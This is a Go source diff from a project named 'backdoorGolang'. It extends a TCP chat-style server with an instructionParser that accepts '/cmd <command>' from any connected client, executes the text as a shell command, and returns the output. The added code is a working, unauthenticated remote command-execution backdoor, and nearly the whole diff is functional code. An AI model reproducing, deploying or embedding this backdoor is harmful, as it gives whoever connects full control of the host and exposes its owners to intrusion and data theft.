@@ -6,7 +6,9 @@ import (
 	"container/list"
 	"bytes"
 	"strings"
+	"regexp"
 	"github.com/pilebones/backdoorGolang/core/socket"
+	"github.com/pilebones/backdoorGolang/core/cli"
 )
 
 const (
@@ -22,16 +24,6 @@ type ServerProvider struct {
 	UseDebugMode bool
 	Clients *list.List
 }
-
-
-/** Init server instance */
-/*func Create(socketWrapper socket.SocketWrapper) ServerProvider {
-	server := new(ServerProvider)
-	server.SocketWrapper = socketWrapper
-	server.Clients = list.New()
-
-	return * server
-}*/
 
 /** Init server instance */
 func Create(target *socket.TargetWrapper, useDebugMode bool) ServerProvider {
@@ -50,7 +42,6 @@ func (s ServerProvider) Start() {
 	go IOHandler(in, s.Clients) // Init clients channel for message (async management)
 
 	// Listen on all <host>:<port>
-	// serverAddr := fmt.Sprintf("%s:%d", s.SocketWrapper.Host, s.SocketWrapper.Port)
 	serverAddr := fmt.Sprintf("%s:%d", s.target.Host, s.target.Port)
 	listener, err := net.Listen("tcp", serverAddr)
 	if err != nil {
@@ -160,7 +151,6 @@ func ClientSender(client *Client) {
  * @param client - Client object
  */
 func ClientReceiver(client *Client) {
-	clientId := client.Connection.RemoteAddr()
 
 	buffer := make([]byte, BUFFER_SIZE)
 	for client.Read(buffer) { // While read data from server-side socket
@@ -171,16 +161,14 @@ func ClientReceiver(client *Client) {
 			continue // Skip empty message
 		}
 
-		fmt.Printf("ClientReader receiver from %s : \"%s\"\n", clientId.String(), messageTrimmed)
+		fmt.Printf("ClientReader receiver from %s : \"%s\"\n", client.GetId(), messageTrimmed)
 		bufferTrimmed := bytes.NewBufferString(messageTrimmed).Bytes() // buffer message whithout "\n"
-		if (bytes.Equal(bufferTrimmed, []byte("/quit"))) {
-			// if (bytes.Equal(bufferTrimmed, logoutMessage)) { // Logout Instruction
-			client.Close()
+		if instructionParser(client, bufferTrimmed) {
 			break;
 		}
 
 		// Sending message to client
-		client.Outgoing <- fmt.Sprintf("[%s] %s\n", clientId.String(), string(bufferTrimmed))
+		client.Outgoing <- fmt.Sprintf("[%s] %s\n", client.GetId(), string(bufferTrimmed))
 
 		// Erase all data from buffer
 		for i:= 0; i < BUFFER_SIZE; i++ {
@@ -188,8 +176,45 @@ func ClientReceiver(client *Client) {
 		}
 	}
 
-	client.Outgoing <- fmt.Sprintf("[%s] has left the server", clientId.String())
+	client.Outgoing <- fmt.Sprintf("[%s] has left the server\n", client.GetId())
 }
+
+/**
+ * Manage instruction from client
+ *
+ * @param client - Client object
+ * @param buffer - Client input
+ */
+func instructionParser(client *Client, buffer []byte) bool {
+	if matched, _ := regexp.Match("^/(quit|exit)$", buffer); matched {  // Logout Instruction
+		client.Close()
+		return true
+	} else if matched, _ := regexp.Match("^/cmd (.+)", buffer); matched { // Command Instruction
+		r := regexp.MustCompile(`^/cmd (?P<command>.*)`)
+		matches := r.FindStringSubmatch(string(buffer))
+		if (1 < len(matches)) {
+			// Handle error if running failed
+			defer func() {
+				if err := recover(); err != nil {
+					// Handle our error.
+					fmt.Printf("[%s] Unable to execute command, error : %s\n", client.GetId(), err)
+					client.SendMessage(fmt.Sprintf("Unable to execute the command, error : %s\n", err))
+				}
+			}()
+
+			command := matches[1];
+			fmt.Printf("[%s] Execute the following system command : %s\n", client.GetId(), command)
+			output := cli.ExecShellScriptOrPanic(command)
+			client.SendMessage(output)
+		}
+
+		// client.SendMessage();
+	}
+
+	return false
+}
+
+
 
 /**
  * Remove from buffer empty data (zero bytes)
